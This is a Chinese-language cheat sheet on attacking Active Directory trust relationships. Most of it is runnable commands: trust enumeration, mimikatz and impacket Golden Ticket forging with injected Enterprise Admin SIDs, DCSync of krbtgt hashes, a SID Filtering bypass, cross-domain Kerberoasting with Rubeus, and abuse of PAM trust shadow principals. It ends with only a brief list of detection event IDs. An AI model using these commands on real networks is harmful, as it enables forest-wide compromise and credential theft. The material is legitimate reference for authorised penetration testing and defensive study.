# 域信任攻击速查

## §0 信任关系枚举

```
# nltest
nltest /domain_trusts /all_trusts /v

# PowerView
Get-DomainTrust
Get-ForestTrust
Get-DomainTrustMapping

# .NET
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# BloodHound Cypher
MATCH (d:Domain)-[:TrustedBy]->(t:Domain) RETURN d.name,t.name
```

**关注点**：信任方向（Inbound/Outbound/Bidirectional）、信任类型（Parent-Child/External/Forest）、SID Filtering状态

## §1 父子域攻击（SIDHistory注入）

**前置**：拿到子域krbtgt hash
```
# mimikatz — 制作带Enterprise Admin SID的Golden Ticket
# 父域Enterprise Admins RID固定为519，SID = 父域SID-519
mimikatz# kerberos::golden /user:Administrator /domain:child.domain.com /sid:S-1-5-21-CHILD-SID /krbtgt:CHILD-KRBTGT-HASH /sids:S-1-5-21-PARENT-SID-519 /ptt

# impacket
ticketer.py -nthash CHILD-KRBTGT-HASH -domain child.domain.com -domain-sid S-1-5-21-CHILD-SID -extra-sid S-1-5-21-PARENT-SID-519 Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass parent-dc.domain.com
```

## §2 林间信任（External Trust）

**利用条件**：外部信任 + SID Filtering未完全开启（或可绕过）
```
# 枚举外部信任
Get-DomainTrust -Domain target.com | ? {$_.TrustType -eq 'External'}

# SID Filtering状态检查
netdom trust child.domain.com /domain:parent.domain.com /quarantine

# SID Filtering绕过：当信任属性包含TREAT_AS_EXTERNAL时，RID>1000的SID可通过
# mimikatz注入目标域的Domain Admins(512)不行，但RID>1000的自定义组可以
```

## §3 Golden Ticket跨域

**前置**：父/根域krbtgt hash（通过§1拿到父域后DCSync）
```
# 制作森林根域Golden Ticket → 林内通杀
mimikatz# kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-ROOT-SID /krbtgt:ROOT-KRBTGT-HASH /ptt

# DCSync所有子域
mimikatz# lsadump::dcsync /domain:child.domain.com /user:krbtgt
```

## §4 跨域Kerberoasting

**前置**：存在跨域SPN注册
```
# 枚举外域SPN
Get-DomainUser -SPN -Domain target.domain.com

# Rubeus请求跨域TGS
Rubeus.exe kerberoast /domain:target.domain.com /dc:dc01.target.domain.com

# impacket
GetUserSPNs.py -target-domain target.domain.com domain.com/user:pass -dc-ip DC_IP
```

## §5 PAM Trust利用

**场景**：Privileged Access Management Trust（Server 2016+）允许影子安全主体跨林访问
```
# 枚举PAM Trust
Get-ADTrust -Filter {TrustType -eq "Forest" -and SIDFilteringForestAware -eq $true}

# 枚举Shadow Principal
Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=com" -Filter * -Properties *

# 利用：拿到bastion森林管理员后，Shadow Principal映射的生产域账户直接可用
```

**检测要点**
- Event 4769（TGS请求）跨域请求监控
- 信任关系变更（Event 4706/4707）
- SIDHistory属性异常修改（Event 4765/4766）
